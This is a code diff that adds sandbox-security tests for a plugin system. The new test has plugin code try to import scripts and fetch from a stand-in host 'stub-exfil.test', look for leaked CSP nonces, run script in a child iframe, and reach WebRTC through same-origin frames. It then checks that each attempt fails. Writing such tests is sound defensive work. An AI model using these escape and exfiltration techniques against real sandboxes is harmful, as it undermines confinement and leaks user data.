@@ -633,6 +633,44 @@ try {
     JSON.stringify({ ...paints, stubHits: stubHits.length }),
   );
 
+  // import() is governed by the policy (no host sources), nothing in the page leaks a secret, and a
+  // frame the plugin creates runs no script of its own.
+  await runCode(`
+    const out = {};
+    for (const u of ["https://stub-exfil.test/m.js", "http://stub-exfil.test/m2.js"]) {
+      try { await import(u); out.imp = "loaded"; } catch (e) { out.imp = "blocked"; }
+    }
+    let pol = "";
+    document.addEventListener("securitypolicyviolation", (e) => { pol = e.originalPolicy; });
+    try { await fetch("https://stub-exfil.test/trigger"); } catch (e) {}
+    await new Promise((r) => setTimeout(r, 200));
+    out.policySeen = pol.length > 0;
+    out.nonceLeak = /nonce-/.test(pol) || !!(document.currentScript && document.currentScript.nonce);
+    let arrived = 0, rtc = "none";
+    window.addEventListener("message", (e) => { if (e.data && e.data.child) { arrived++; rtc = e.data.child; } });
+    const f = document.createElement("iframe");
+    f.srcdoc = "<script>parent.postMessage({ child: typeof RTCPeerConnection }, '*')<\\/script>";
+    document.body.appendChild(f);
+    const g = document.createElement("iframe");
+    document.body.appendChild(g);
+    try { out.blankRealm = typeof g.contentWindow.RTCPeerConnection; } catch (e) { out.blankRealm = "blocked"; }
+    const h = document.createElement("iframe");
+    h.srcdoc = "<p>x</p>";
+    document.body.appendChild(h);
+    try { out.srcdocRealm = typeof h.contentWindow.RTCPeerConnection; } catch (e) { out.srcdocRealm = "blocked"; }
+    await new Promise((r) => setTimeout(r, 1000));
+    out.arrived = arrived;
+    out.rtc = rtc;
+    await dt.tool("update_nodes", { updates: [{ id: "${target}", name: JSON.stringify(out) }] });`);
+  await waitStopped();
+  const imp = JSON.parse(await nodeName(target));
+  check(
+    "plugin import() of a web address is blocked, no nonce leaks, a child frame runs no script, the stub host saw nothing",
+    imp.imp === "blocked" && imp.nonceLeak === false && imp.arrived === 0 && stubHits.length === 0,
+    JSON.stringify({ ...imp, stubHits: stubHits.length }),
+  );
+  check("a plugin can't reach a fresh WebRTC through a same-origin child frame's window", imp.blankRealm !== "function" && imp.srcdocRealm !== "function", `${imp.blankRealm}/${imp.srcdocRealm}`);
+
   // A plugin that navigates its own frame is stopped.
   await runCode(`await dt.notify("hi"); location.href = "data:text/html,<p>gone</p>"; await new Promise((r) => setTimeout(r, 5000));`);
   await waitStopped();
